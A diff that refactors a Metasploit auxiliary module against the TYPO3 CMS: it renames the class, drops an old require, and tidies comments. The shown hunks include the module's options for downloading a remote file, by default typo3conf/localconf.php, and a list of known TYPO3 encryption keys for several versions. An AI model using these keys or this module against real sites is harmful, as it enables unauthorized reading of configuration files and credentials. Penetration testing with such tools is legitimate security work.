@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit4 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
 
@@ -55,7 +52,7 @@ class Metasploit4 < Msf::Auxiliary
         OptString.new('URI', [true, "TYPO3 Path", "/"]),
         OptString.new('RFILE', [true, "The remote file to download", 'typo3conf/localconf.php']),
         OptString.new('ENC_KEY', [false, "Encryption key if known", '']),
-      ], self.class)
+      ])
 
   end
 
@@ -100,20 +97,20 @@ class Metasploit4 < Msf::Auxiliary
   else
     print_status("Rotating through known encryption keys")
     encryption_keys = [
-      #TYPO3 4.3.x - 4.4.x
+      # TYPO3 4.3.x - 4.4.x
       'd696ab49a803d7816021cb1768a6917d',
       '47d1e990583c9c67424d369f3414728e6793d9dc2ae3429d488a7374bc85d2a0b19b62de67d46a6079a75f10934288d3',
       '7b13b2203029ed80337f27127a9f1d28c2597f4c08c9a07b782b674731ecf5328c4d900851957899acdc6d4f911bf8b7',
-      #TYPO3 4.4.7+
+      # TYPO3 4.4.7+
       'fbbdebd9091d914b3cd523485afe7b03e6006ade4125e4cf4c46195b3cecbb9ae0fe0f7b5a9e72ea2ac5f17b66f5abc7',
-      #TYPO3 4.5.0
+      # TYPO3 4.5.0
       'def76f1d8139304b7edea83b5f40201088ba70b20feabd8b2a647c4e71774b7b0e4086e4039abaf5d4f6a521f922e8a2',
       'bac0112e14971f00431639342415ff22c3c3bf270f94175b8741c0fa95df244afb61e483c2facf63cffc320ed61f2731',
-      #TYPO3 4.5.2
+      # TYPO3 4.5.2
       '14b1225e2c277d55f54d18665791f114f4244f381113094e2a19dfb680335d842e10460995eb653d105a562a5415d9c7',
-      #TYPO3 4.5.3
+      # TYPO3 4.5.3
       '5d4eede80d5cec8df159fd869ec6d4041cd2fc0136896458735f8081d4df5c22bbb0665ddac56056023e01fbd4ab5283',
-      #TYPO3 4.5.4 - 4.5.7
+      # TYPO3 4.5.4 - 4.5.7
       'b2aae63def4c512ce8f4386e57b8a48b40312de30775535cbff60a6eab356809a0b596edaad49c725d9963d93aa2ffae',
       ]
   end
@@ -200,5 +197,4 @@ class Metasploit4 < Msf::Auxiliary
   print_error("Maybe try checking the ACTIONS - Currently using  #{action.name}")
 
   end
-
 end
